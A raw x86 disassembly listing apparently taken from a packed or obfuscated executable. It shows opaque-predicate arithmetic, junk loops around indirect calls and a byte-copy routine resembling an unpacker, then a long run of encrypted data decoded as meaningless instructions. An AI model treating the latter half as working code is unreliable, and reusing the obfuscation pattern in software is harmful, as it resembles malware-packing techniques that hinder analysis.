  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427df1
  41d28a:	mov    ecx,DWORD PTR ds:0x429eb5
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x42fa2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x42fa38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x42fa3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [eax+0x6296893e],al
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x6870e085],1
  41d522:	scas   al,BYTE PTR es:[edi]
  41d523:	dec    ecx
  41d524:	and    dl,0xde
  41d527:	inc    DWORD PTR [edx+ebp*1]
  41d52a:	sbb    dh,al
  41d52c:	ret    
  41d52d:	sub    DWORD PTR [edi-0x49],eax
  41d530:	inc    ebx
  41d531:	retf   
  41d532:	sub    bh,BYTE PTR [eax]
  41d534:	cmp    eax,0x1ec6339b
  41d539:	adc    DWORD PTR [eax+eiz*4-0x71],eax
  41d53d:	push   edi
  41d53e:	cmp    al,0xb9
  41d540:	jecxz  0x41d4c4
  41d542:	ret    0xeead
  41d545:	cmp    eax,0x1e339fa8
  41d54a:	push   edi
  41d54b:	sbb    BYTE PTR [edx+0x42],al
  41d54e:	jmp    0xd29d:0x1dc718fb
  41d555:	fsubp  st(7),st
  41d557:	test   BYTE PTR [ebx-0x42],bh
  41d55a:	cli    
  41d55b:	sahf   
  41d55c:	mov    ecx,0x50aafbea
  41d561:	fnop   
  41d563:	ins    DWORD PTR es:[edi],dx
  41d564:	test   al,0xad
  41d566:	(bad)  
  41d567:	mov    cl,0x5e
  41d569:	push   ebx
  41d56a:	jmp    0x41d5d9
  41d56c:	xor    BYTE PTR [edx-0x3b],0x74
  41d570:	ss push ss
  41d572:	jb     0x41d508
  41d574:	xor    dl,BYTE PTR [ebp-0x2736f20f]
  41d57a:	lea    esp,[eax-0x498c1b3a]
  41d580:	xchg   edi,eax
  41d581:	call   0x674ea2a8
  41d586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d587:	xor    al,0x27
  41d589:	push   edx
  41d58a:	sbb    al,0xa3
  41d58c:	iret   
  41d58d:	add    DWORD PTR [edx+0x227f1661],0x1df614d1
  41d597:	sbb    bh,BYTE PTR [ecx-0x42]
  41d59a:	mov    ebx,0x20492c2e
  41d59f:	sub    BYTE PTR [ebx],dh
  41d5a1:	es daa 
  41d5a3:	mov    cl,0xfa
  41d5a5:	pop    esi
  41d5a6:	add    ebp,DWORD PTR [ebx+0x40]
  41d5a9:	aam    0xaa
  41d5ab:	test   eax,0xf16c1f1
  41d5b0:	xchg   ebx,eax
  41d5b1:	cwde   
  41d5b2:	fiadd  DWORD PTR [edx-0x3fc28350]
  41d5b8:	mov    ds,WORD PTR [esi]
  41d5ba:	cmp    esp,ebp
  41d5bc:	pop    ecx
  41d5bd:	lods   al,BYTE PTR ds:[esi]
  41d5be:	push   esp
  41d5bf:	xor    ecx,DWORD PTR [edx+0x60]
  41d5c2:	and    eax,0x4f554852
  41d5c7:	and    eax,0xbcb85746
  41d5cc:	cdq    
  41d5cd:	inc    edx
  41d5ce:	int    0xa7
  41d5d0:	xor    DWORD PTR [ecx],ebp
  41d5d2:	xlat   BYTE PTR ds:[ebx]
  41d5d3:	push   eax
  41d5d4:	mov    ds:0x1c85866b,eax
  41d5d9:	pop    edi
  41d5da:	pop    ecx
  41d5db:	or     al,0x18
  41d5dd:	jmp    0xd636:0x3375003c
  41d5e4:	aaa    
  41d5e5:	cmc    
  41d5e6:	loop   0x41d607
  41d5e8:	cmp    bh,BYTE PTR [ebx+0xa29d4d]
  41d5ee:	mov    WORD PTR [edi-0xa],cs
  41d5f1:	sbb    edi,DWORD PTR [esi+0x103575c2]
  41d5f7:	mov    eax,ds:0x22837382
  41d5fc:	adc    ebp,DWORD PTR ds:0xf8bd4c02
  41d602:	xchg   ebp,eax
  41d603:	je     0x41d60b
  41d605:	jns    0x41d5bc
  41d607:	adc    al,0xe9
  41d609:	je     0x41d688
  41d60b:	sbb    al,0xdb
  41d60d:	or     esi,DWORD PTR [ebp-0x60]
  41d610:	stos   DWORD PTR es:[edi],eax
  41d611:	add    BYTE PTR [ecx],cl
  41d613:	xchg   cx,ax
  41d615:	fldln2 
  41d617:	mov    ch,0x5d
  41d619:	add    esp,DWORD PTR [edx-0x46]
  41d61c:	cmove  edi,DWORD PTR [ecx-0x76270af7]
  41d623:	jns    0x41d666
  41d625:	inc    edx
  41d626:	(bad)  
  41d627:	popa   
  41d628:	sub    bh,al
  41d62a:	gs or  dh,al
  41d62d:	shl    BYTE PTR [ebx+0x6301e9e2],0xfe
  41d634:	pop    es
  41d635:	out    dx,eax
  41d636:	mov    eax,ebx
  41d638:	cmp    BYTE PTR [eax+0x45],0x74
  41d63c:	sub    BYTE PTR [edx],dl
  41d63e:	pop    ebp
  41d63f:	aaa    
  41d640:	adc    eax,0x89154216
  41d645:	dec    esp
  41d646:	sub    DWORD PTR [eax-0x3a278192],0xc9d48bdb
  41d650:	test   al,0xfd
  41d652:	mov    ds:0xe02d2fc,al
  41d657:	mov    eax,ds:0x883377e1
  41d65c:	(bad)  
  41d65d:	fstp   QWORD PTR [ecx+ecx*8-0x5006bb8e]
  41d664:	push   ss
  41d665:	mov    dh,0x0
  41d667:	mov    ds:0x87671b78,eax
  41d66c:	inc    eax
  41d66d:	jmp    0x5d0a:0xb4dd41c8
  41d674:	pop    ebp
  41d675:	xor    BYTE PTR [esi-0x3859b469],ah
  41d67b:	xchg   DWORD PTR [ebx+ebx*2-0x1f8d4b9f],esi
  41d682:	mov    ch,0xa1
  41d684:	lds    edi,FWORD PTR [ebp-0x3a3e3dba]
  41d68a:	daa    
  41d68b:	sbb    eax,0x7f35ae71
  41d690:	clc    
  41d691:	xchg   ebx,eax
  41d692:	pop    ebx
  41d693:	sub    esi,DWORD PTR [eax]
  41d695:	xchg   edi,eax
  41d696:	mov    ch,0xe2
  41d698:	popa   
  41d699:	xor    al,0x16
  41d69b:	fdiv   QWORD PTR [eax]
  41d69d:	loopne 0x41d6f4
  41d69f:	jg     0x41d6bc
  41d6a1:	fstp   DWORD PTR [edx]
  41d6a3:	into   
  41d6a4:	ret    
  41d6a5:	imul   edi,DWORD PTR [ebp-0x16],0xffffffb0
  41d6a9:	aas    
  41d6aa:	sub    BYTE PTR [ecx-0xabc9271],bh
  41d6b0:	scas   eax,DWORD PTR es:[edi]
  41d6b1:	sub    ch,BYTE PTR cs:[ebx]
  41d6b4:	mov    DWORD PTR [ebx+0xb],edi
  41d6b7:	lock push ss
  41d6b9:	outs   dx,BYTE PTR gs:[esi]
  41d6bb:	dec    esp
  41d6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6bd:	mov    bl,0x9f
  41d6bf:	scas   al,BYTE PTR es:[edi]
  41d6c0:	jmp    0x27d8:0x6e40caf6
  41d6c7:	pcmpeqb mm5,QWORD PTR ds:0xf8f658f0
  41d6ce:	mov    ds:0x4335e802,al
  41d6d3:	xor    ch,BYTE PTR [ecx-0xb]
  41d6d6:	idiv   BYTE PTR [ecx+esi*4]
  41d6d9:	leave  
  41d6da:	std    
  41d6db:	gs mov edi,0x3b8b541a
  41d6e1:	pop    edi
  41d6e2:	int3   
  41d6e3:	(bad)  
  41d6e4:	inc    ecx
  41d6e5:	call   0x543a:0x37db433e
  41d6ec:	test   DWORD PTR [eax],esp
  41d6ee:	xlat   BYTE PTR ds:[ebx]
  41d6ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6f0:	aam    0xdc
  41d6f2:	push   es
  41d6f3:	or     eax,0xe2c39e37
  41d6f8:	mov    edi,0xeef5aa1a
  41d6fd:	push   0x547073a9
  41d702:	mov    bl,0x51
  41d704:	add    BYTE PTR [eax-0x48293c5f],ah
  41d70a:	mov    edi,0xa290096d
  41d70f:	adc    DWORD PTR ds:0x96ae935,esi
  41d715:	ins    DWORD PTR es:[edi],dx
  41d716:	push   0x5dc2ccb1
  41d71b:	syscall 
  41d71d:	repz lea edi,[esi+0x5b401da3]
  41d724:	retf   0xfa7b
  41d727:	xor    eax,0x5fe9e032
  41d72c:	in     al,dx
  41d72d:	cmp    al,0xd9
  41d72f:	xor    al,0xe3
  41d731:	in     al,dx
  41d732:	sbb    al,0x42
  41d734:	add    bl,BYTE PTR [edx-0x1170b982]
  41d73a:	div    DWORD PTR [edi-0x1543d7ee]
  41d740:	shl    DWORD PTR [eax],0xa6
  41d743:	pop    esi
  41d744:	mov    ah,0xb6
  41d746:	jbe    0x41d6ec
  41d748:	sub    eax,0x4ddb8ca3
  41d74d:	pusha  
  41d74e:	jne    0x41d74b
  41d750:	(bad)  
  41d751:	inc    eax
  41d752:	stos   BYTE PTR es:[edi],al
  41d753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d754:	vsubpd ymm0,ymm3,ymm2
  41d758:	inc    edi
  41d759:	mov    esp,0xea80eee7
  41d75e:	daa    
  41d75f:	fwait
  41d760:	xor    esi,DWORD PTR ds:0xc0906441
  41d766:	xchg   BYTE PTR [ecx-0x5c],al
  41d769:	adc    esi,eax
  41d76b:	(bad)  
  41d76c:	cmc    
  41d76d:	or     edi,ecx
  41d76f:	jecxz  0x41d765
  41d771:	and    dl,dh
  41d773:	outs   dx,DWORD PTR ds:[esi]
  41d774:	push   ebx
  41d775:	inc    BYTE PTR [eax-0x5a]
  41d778:	push   esp
  41d779:	xchg   ecx,eax
  41d77a:	mov    ah,0xd1
  41d77c:	rol    ecx,cl
  41d77e:	lods   al,BYTE PTR ds:[esi]
  41d77f:	outs   dx,DWORD PTR ds:[esi]
  41d780:	add    DWORD PTR [esi+edx*2+0x61],0x44
  41d785:	(bad)  
  41d786:	das    
  41d787:	cs stc 
  41d789:	shl    BYTE PTR [ebx-0x1c48216a],cl
  41d78f:	jmp    0x41d7fb
  41d791:	inc    edi
  41d792:	inc    ebp
  41d793:	mov    cl,BYTE PTR [ebx]
  41d795:	push   eax
  41d796:	repz imul esp,DWORD PTR [di-0xff7],0xffffffb6
  41d79d:	push   ebp
  41d79e:	add    ah,bh
  41d7a0:	push   edx
  41d7a1:	imul   ecx,DWORD PTR [ebx],0x3f
  41d7a4:	shr    DWORD PTR [eax-0x4b],cl
  41d7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a8:	std    
  41d7a9:	push   edi
  41d7aa:	punpckhbw mm5,mm0
  41d7ad:	sub    al,0xb
  41d7af:	data16 loopne 0x41d738
  41d7b2:	sti    
  41d7b3:	xor    BYTE PTR [ebx-0x50],al
  41d7b6:	dec    ecx
  41d7b7:	imul   edi,DWORD PTR [eax-0x45],0xffffff95
  41d7bb:	lods   al,BYTE PTR ds:[esi]
  41d7bc:	les    esi,FWORD PTR [edx]
  41d7be:	hlt    
  41d7bf:	add    BYTE PTR [eax+0x64291078],bl
  41d7c5:	dec    esp
  41d7c6:	jmp    0x36c1:0x2c15e341
  41d7cd:	rcr    DWORD PTR [esi+edi*2-0x7e],cl
  41d7d1:	scas   eax,DWORD PTR es:[edi]
  41d7d2:	push   0xb8102019
  41d7d7:	pop    ebp
  41d7d8:	xchg   ah,cl
  41d7da:	out    0x28,al
  41d7dc:	test   eax,0x9e89ffb4
  41d7e1:	add    al,0xd8
  41d7e3:	add    bh,BYTE PTR [edi]
  41d7e5:	es xchg edi,eax
  41d7e7:	cs jo  0x41d83f
  41d7ea:	in     al,0x86
  41d7ec:	sar    BYTE PTR [esi-0x44cd76c0],0x69
  41d7f3:	xor    ebp,eax
  41d7f5:	stos   BYTE PTR es:[edi],al
  41d7f6:	push   edi
  41d7f7:	lods   al,BYTE PTR ds:[esi]
  41d7f8:	mov    ch,0xcf
  41d7fa:	mov    WORD PTR [eax+0x140d2d30],ss
  41d800:	sub    ah,BYTE PTR cs:[eax+0x15deef15]
  41d807:	jo     0x41d7e2
  41d809:	add    DWORD PTR [edx],0xffffffaf
  41d80c:	outs   dx,BYTE PTR ds:[esi]
  41d80d:	jp     0x41d86b
  41d80f:	pop    esi
  41d810:	cmp    bl,ch
  41d812:	loope  0x41d865
  41d814:	jl     0x41d7ea
  41d816:	fwait
  41d817:	push   esp
  41d818:	sub    DWORD PTR [eax],ebp
  41d81a:	ds stos BYTE PTR es:[edi],al
  41d81c:	or     BYTE PTR [edx],ch
  41d81e:	mov    ds:0x8c726c76,eax
  41d823:	pop    edi
  41d824:	clc    
  41d825:	mov    al,ds:0x783af506
  41d82a:	mov    ebp,gs
  41d82c:	sub    ebx,ebx
  41d82e:	pop    ebx
  41d82f:	sbb    dl,BYTE PTR [esi+0x11]
  41d832:	push   es
  41d833:	cwde   
  41d834:	xor    BYTE PTR [ecx-0x70fc9a01],bh
  41d83a:	int    0x92
  41d83c:	push   ss
  41d83d:	addps  xmm4,XMMWORD PTR [edi]
  41d840:	cmc    
  41d841:	and    esi,DWORD PTR [ebp-0x9e1f33b]
  41d847:	mov    ecx,0xc05eb9ac
  41d84c:	scas   eax,DWORD PTR es:[edi]
  41d84d:	xchg   ebp,eax
  41d84e:	mov    esi,0x56a47ed3
  41d853:	xchg   ebp,eax
  41d854:	adc    edi,edx
  41d856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d857:	mov    cs,ebx
  41d859:	neg    esi
  41d85b:	js     0x41d860
  41d85d:	push   ss
  41d85e:	jge    0x41d851
  41d860:	dec    esp
  41d861:	in     al,0xad
  41d863:	lds    eax,FWORD PTR [edx-0x6373e385]
  41d869:	mov    dh,0xe6
  41d86b:	ds adc edx,edx
  41d86e:	dec    edi
  41d86f:	push   esp
  41d870:	mov    eax,0x399ff483
  41d875:	inc    ecx
  41d876:	mov    cl,BYTE PTR gs:[ebx+0x6d043246]
  41d87d:	int3   
  41d87e:	xchg   esp,eax
  41d87f:	repz ret 
  41d881:	in     eax,dx
  41d882:	add    eax,0x5204ba58
  41d887:	lods   al,BYTE PTR ds:[esi]
  41d888:	out    dx,eax
  41d889:	jg     0x41d826
  41d88b:	push   0xffffff82
  41d88d:	mov    cl,0xd0
  41d890:	js     0x41d8f3
  41d892:	sbb    BYTE PTR [edx-0x3c9c31a6],ch
  41d898:	pop    ecx
  41d899:	into   
  41d89a:	iret   
  41d89b:	xchg   esi,eax
  41d89c:	loope  0x41d82e
  41d89e:	mov    ebx,0xcea721e6
  41d8a3:	mov    ah,0xd2
  41d8a5:	fbstp  TBYTE PTR [ecx-0x56]
  41d8a8:	cmp    al,ah
  41d8aa:	mov    edi,0x96199ea3
  41d8af:	pop    es
  41d8b0:	push   esp
  41d8b1:	test   eax,0x377b5ecd
  41d8b6:	push   eax
  41d8b7:	mov    esp,0xc4927f4e
  41d8bc:	out    dx,al
  41d8bd:	in     al,dx
  41d8be:	shl    DWORD PTR [eax+edx*4+0x78cab74f],cl
  41d8c5:	jmp    DWORD PTR [ebx-0x2ab28239]
  41d8cb:	enter  0xaf63,0xe8
  41d8cf:	rol    BYTE PTR [ecx-0x35dddcbf],1
  41d8d5:	sar    DWORD PTR [ebx+0x1bee4ce],cl
  41d8db:	and    edx,edi
  41d8dd:	test   BYTE PTR [ecx-0x1a],al
  41d8e0:	push   0xe2f000b0
  41d8e5:	push   cs
  41d8e6:	int    0x35
  41d8e8:	jmp    0xcc42:0xd58c6f3a
  41d8ef:	add    ebp,edi
  41d8f1:	js     0x41d8d3
  41d8f3:	xchg   ebp,eax
  41d8f4:	add    BYTE PTR [esi-0x433c6e4c],0x35
  41d8fb:	mov    eax,0x98e7a2cb
  41d900:	iret   
  41d901:	mov    ecx,0x28b71fb9
  41d906:	xor    al,0xb9
  41d908:	les    esi,FWORD PTR [ebx]
  41d90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90b:	into   
  41d90c:	mov    dl,0x7a
  41d90e:	pop    edx
  41d90f:	mov    ecx,0x80d29768
  41d914:	fbstp  TBYTE PTR [edx+0x56]
  41d917:	test   al,0x48
  41d919:	clc    
  41d91a:	sub    eax,DWORD PTR [edi+edx*2-0x42]
  41d91e:	test   DWORD PTR [edi+edi*1-0x54],edi
  41d922:	mov    DWORD PTR [ebp+0x67430233],edi
  41d928:	shl    DWORD PTR [eax+eiz*2+0xa],1
  41d92c:	stc    
  41d92d:	pushf  
  41d92e:	bound  eax,QWORD PTR [ecx+0x1b]
  41d931:	repz mov ch,0xbc
  41d934:	pop    ebx
  41d935:	lods   al,BYTE PTR ds:[esi]
  41d936:	out    dx,eax
  41d937:	call   0x16:0x9b9bb6ff
  41d93e:	pop    eax
  41d93f:	push   cs
  41d940:	fldcw  WORD PTR [edi+0x4a]
  41d943:	fiadd  DWORD PTR [edi+eax*8]
  41d946:	mov    edx,0xf6bc2eab
  41d94b:	ret    0xc2c
  41d94e:	loope  0x41d9a0
  41d950:	dec    edi
  41d951:	sbb    al,0xce
  41d953:	xor    edi,0xdd5b3895
  41d959:	sbb    edx,DWORD PTR [eax-0x7a]
  41d95c:	xor    al,0xd0
  41d95e:	pop    ss
  41d95f:	dec    edi
  41d960:	arpl   WORD PTR [edx+0x5e],ax
  41d963:	jnp    0x41d90b
  41d965:	mov    esp,0x2232b541
  41d96a:	aam    0x2c
  41d96c:	outs   dx,BYTE PTR ds:[esi]
  41d96d:	mov    ecx,DWORD PTR [ebx+0x6d]
  41d970:	out    0x19,eax
  41d972:	push   ebx
  41d973:	aam    0xa4
  41d975:	pop    ecx
  41d976:	push   cs
  41d977:	pop    ebx
  41d978:	sbb    DWORD PTR [esi+ecx*1-0x68],esi
  41d97c:	push   eax
  41d97d:	push   0xfdabac00
  41d982:	adc    ch,dh
  41d984:	or     BYTE PTR [edx+0x30],bl
  41d987:	cmp    DWORD PTR [eax+eax*4+0x7b],ecx
  41d98b:	lods   al,BYTE PTR ds:[esi]
  41d98c:	push   ds
  41d98d:	push   ebp
  41d98e:	fisub  WORD PTR [edx+ecx*4-0x53ba95fd]
  41d995:	xor    bh,BYTE PTR ds:0x5ef85f39
  41d99b:	xchg   ebx,eax
  41d99c:	ror    dh,0xbe
  41d99f:	mov    bh,0x1f
  41d9a1:	repz je 0x41da1b
  41d9a4:	neg    BYTE PTR [ecx]
  41d9a6:	sub    al,0x8c
  41d9a8:	inc    esp
  41d9a9:	push   ds
  41d9aa:	jge    0x41da1f
  41d9ac:	sub    esi,DWORD PTR [ebx-0x586570cc]
  41d9b2:	pop    ds
  41d9b3:	daa    
  41d9b4:	cmp    ch,dh
  41d9b6:	xor    eax,0xe77a2994
  41d9bb:	sub    eax,0xd742e467
  41d9c0:	xlat   BYTE PTR ds:[ebx]
  41d9c1:	cmp    eax,0x2604d193
  41d9c6:	mov    gs,WORD PTR [esi+edi*1-0x10]
  41d9ca:	jge    0x41d970
  41d9cc:	je     0x41da27
  41d9ce:	je     0x41d9de
  41d9d0:	adc    ch,BYTE PTR [ebp-0x7bad04e8]
  41d9d6:	push   ecx
  41d9d7:	and    al,0xd
  41d9d9:	sbb    bh,bh
  41d9db:	in     al,dx
  41d9dc:	xchg   edi,eax
  41d9dd:	aaa    
  41d9de:	sub    DWORD PTR [eax+eiz*1+0x42c87b75],ecx
  41d9e5:	push   cs
  41d9e6:	std    
